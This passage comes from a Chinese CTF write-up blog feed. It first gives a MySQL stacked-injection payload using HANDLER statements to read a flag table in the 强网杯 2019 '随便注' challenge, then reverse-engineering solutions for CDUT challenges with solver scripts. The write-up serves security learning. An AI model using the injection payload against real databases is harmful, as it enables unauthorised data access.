&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;HANDLER `FlagHere` OPEN;HANDLER `FlagHere` READ FIRST;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;来读取内容，get到flag&lt;/p&gt;
&lt;p&gt;同时，这种解法也适用于强网杯&lt;/p&gt;
&lt;h2 id=&#34;强网杯-2019随便注&#34;&gt;[强网杯 2019]随便注
&lt;/h2&gt;&lt;p&gt;show tables看看都有什么表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803962-1630637127.png&#34;
	width=&#34;461&#34;
	height=&#34;501&#34;
	srcset=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803962-1630637127_hu12554583468788614033.png 480w, https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803962-1630637127_hu13087458097796678615.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201120165436885&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;92&#34;
		data-flex-basis=&#34;220px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;网上的wp有改表名的，也有预处理的，在此不再赘述，我们直接使用handler：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171804463-748046346.png&#34;
	width=&#34;1585&#34;
	height=&#34;578&#34;
	srcset=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171804463-748046346_hu17987949271448776138.png 480w, https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171804463-748046346_hu12351745883398734621.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201120170055119&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;658px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;数据库真是太美妙了&#34;&gt;数据库真是太美妙了
&lt;/h4&gt;</description>
        </item>
        <item>
        <title>CDUT第一届信安大挑战Re-wp</title>
        <link>https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/</link>
        <pubDate>Sun, 15 Nov 2020 11:25:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/</guid>
        <description>&lt;h2 id=&#34;题目名称easymaze&#34;&gt;题目名称：EASYMAZE
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Gyan&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IDA不好用了？因为这是C#&lt;/p&gt;
&lt;p&gt;扔进dnspy&lt;/p&gt;
&lt;p&gt;进入check函数发现这是一个迷宫&lt;/p&gt;
&lt;p&gt;从C经过*走到X,0为下，1为上，2为右，3为左&lt;/p&gt;
&lt;p&gt;路径：2220000000221220221221133333311222211220022112220030020002&lt;/p&gt;
&lt;p&gt;提交dino{2220000000221220221221133333311222211220022112220030020002}发现不对?&lt;/p&gt;
&lt;p&gt;继续审计代码，找到两个关键的地方&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192114799-490664837.png&#34;
	width=&#34;518&#34;
	height=&#34;278&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192114799-490664837_hu7191297812616164198.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192114799-490664837_hu13355350666811142825.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;第一个地方是将数据转换成十六进制，第二个地方是将这个十六进制的数据拆成前两位和后两位，即  &amp;lsquo;a&amp;rsquo; =&amp;gt;0xa =&amp;gt;1010 =&amp;gt; array2 = {10,10}，所以我们应该一次&amp;quot;走两步“&lt;/p&gt;
&lt;p&gt;即22 =&amp;gt;1010 =&amp;gt;a，以此类推&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115503-806449302.png&#34;
	width=&#34;993&#34;
	height=&#34;519&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115503-806449302_hu9341921458016429099.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115503-806449302_hu3569542399268807112.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;191&#34;
		data-flex-basis=&#34;459px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//最后部分我是手算的，附上DorinXL师傅的脚本
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&amp;lt;iostream&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&amp;lt;cstring&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;2220000000221220221221133333311222211220022112220030020002&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;					&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;					&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;题目名称嘘&#34;&gt;题目名称:嘘!
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Gyan&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;双击后打不开？？？？直接扔进IDA&lt;/p&gt;
&lt;p&gt;发现一大堆看不懂的东西!!!&lt;/p&gt;
&lt;p&gt;往旁边函数里一看，发现一个创建窗口的函数WinMain&lt;/p&gt;
&lt;p&gt;点击即得flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115922-405011802.png&#34;
	width=&#34;415&#34;
	height=&#34;70&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115922-405011802_hu3956017431266146724.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192115922-405011802_hu9609733223941527042.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;592&#34;
		data-flex-basis=&#34;1422px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;题目名称捉迷藏&#34;&gt;题目名称:捉迷藏
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;DorinXL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查壳！出这个题的师傅本来没加壳的，我（&lt;strong&gt;Nameless&lt;/strong&gt;）手贱加了:)&lt;/p&gt;
&lt;p&gt;直接upx -d 脱壳 （记得用高版本的upx，不然可能失败）手脱可无视&lt;/p&gt;
&lt;p&gt;脱完壳后扔进ida,shift+F12一把梭&lt;/p&gt;
&lt;p&gt;在几个有字符串的地方找到数据，然后直接按R&lt;/p&gt;
&lt;p&gt;如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116475-780223347.png&#34;
	width=&#34;978&#34;
	height=&#34;155&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116475-780223347_hu8406558835446078097.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192116475-780223347_hu16398957585547229629.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;630&#34;
		data-flex-basis=&#34;1514px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;找到其他几段后，拼接出来就行&lt;/p&gt;
&lt;h2 id=&#34;题目名称base64&#34;&gt;题目名称:base64
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;DorinXL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ida64打开，发现是base64编码加密&lt;/p&gt;
&lt;p&gt;看左边函数，会发现ohMyGod函数，进去看后，发现更换了base64的表（这里如果不懂，要去看base64的原理）&lt;/p&gt;
&lt;p&gt;写出新表的脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Y2R1KgtDM195M3VIN25vK19FYXaCX2OGMWCsJT99&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
